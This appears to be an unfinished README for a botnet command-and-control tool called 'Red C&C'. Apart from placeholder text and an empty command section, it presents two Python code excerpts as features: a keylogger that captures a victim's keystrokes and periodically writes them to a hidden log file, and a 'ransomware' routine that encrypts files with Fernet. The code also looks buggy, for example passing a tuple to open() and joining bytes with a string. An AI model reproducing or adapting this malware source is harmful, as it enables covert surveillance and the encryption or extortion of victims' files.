# Botnet-Command-Control
Explain what our program here!!!


### Show how to initiate Command
```bash
```

## Some of Red C&C's Highlights
### Built-in Keylogger
```python
def on_press(key):
	global LOG
	try:
		LOG += str(key.char)
	except AttributeError:
		if key == key.space:
			LOG += ' '
		elif key == key.enter: LOG += '\n'
		elif key == key.backspace: LOG += ''
		elif key == key.ctrl: LOG += ' ctrl+'
		elif key == key.tab: LOG += '\t'
		elif key == key.cmd: LOG += ' cmd+'
		else:
			LOG += str(key)

def log_to_file():
	if SYSTEM == 'Linux':
		f = open(LIN_DIR + 'log.txt', 'w')
		f.write(LOG)
	else:
		f = open(WIN_DIR + 'log.txt', 'w')
		f.write(LOG)
	cycle = Timer(SECONDS_TO_LOG, log_to_file)
	cycle.start()

def keylogger():
	listener = keyboard.Listener(on_press=on_press)
	try:
		if SYSTEM == 'Linux':
			os.mkdir(LIN_DIR)
		else:
			os.mkdir(WIN_DIR)
		log_to_file()
		listener.start()
	except OSError:
		pass
```
### Built-in Rasonware Operations
```python
def crypto(action, *request):
	key_copy = ''

	def encrypt_it():
		to_encrypt = request
		with open(to_encrypt, 'rb') as inf:
			data = inf.read()
			with open(to_encrypt, 'wb') as ouf:
				key = Fernet.generate_key()
				key_copy = key
				cipher = Fernet(key)
				cipher_text = cipher.encrypt(data)
				ouf.write(cipher_text)
		return r'File encrypted... Key = ' + key_copy + '. Store this key for decryption.'
	
	def decrypt_it():
		to_encrypt, key = request
		with open(to_encrypt, 'rb') as inf:
			data = inf.read()
			with open(to_encrypt, 'wb') as ouf: 
				cipher = Fernet(key)
				plain_text = cipher.decrypt(data)
				ouf.write(plain_text)
		return r'File Decrypted...'
		
	if action == 'encrypt':
		return encrypt_it()
	else:
		return decrypt_it()
```
